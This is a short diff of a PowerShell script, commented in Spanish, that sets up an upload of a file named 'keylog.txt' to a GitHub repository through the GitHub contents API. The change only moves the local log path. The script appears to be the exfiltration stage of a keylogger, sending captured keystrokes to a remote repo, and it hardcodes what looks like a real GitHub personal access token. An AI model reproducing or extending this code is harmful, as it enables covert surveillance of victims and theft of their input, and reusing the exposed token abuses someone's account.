@@ -2,9 +2,9 @@
 $token = "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"  # Reemplaza con tu token de acceso personal de GitHub
 $repoOwner = "SAHIBADAS"  # Reemplaza con tu nombre de usuario o la organización del repositorio
 $repoName = "Prueba_klg"  # Reemplaza con el nombre de tu repositorio
-$filePath = "C:\keylog.txt"
+$filePath = "C:\Usuarios\keylog.txt"
 $name = "keylog"
-$path = "C:\$name.txt"
+$path = "C:\Usuarios\$name.txt"
 $branch = "main"  # Cambia si usas otra rama
 $commitMessage = "Prueba desde otro dispositivo"
 $apiUrl = "https://api.github.com/repos/$repoOwner/$repoName/contents/$(Split-Path -Leaf $filePath)"
